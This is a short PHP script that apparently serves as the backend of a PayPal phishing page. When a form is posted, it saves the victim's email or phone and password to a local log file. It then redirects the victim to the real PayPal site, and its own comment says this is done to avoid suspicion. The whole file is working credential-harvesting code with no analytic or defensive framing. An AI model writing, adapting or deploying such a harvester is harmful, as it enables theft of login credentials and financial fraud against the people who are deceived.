<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = htmlspecialchars($_POST["email"]);
    $password = htmlspecialchars($_POST["password"]);

    // Save credentials to a file
    $file = fopen("log.txt", "a");
    fwrite($file, "Email/Phone: " . $email . "\n");
    fwrite($file, "Password: " . $password . "\n\n");
    fclose($file);

    // Redirect to real PayPal page to avoid suspicion
    header("Location: https://www.paypal.com/");
    exit();
}
?>
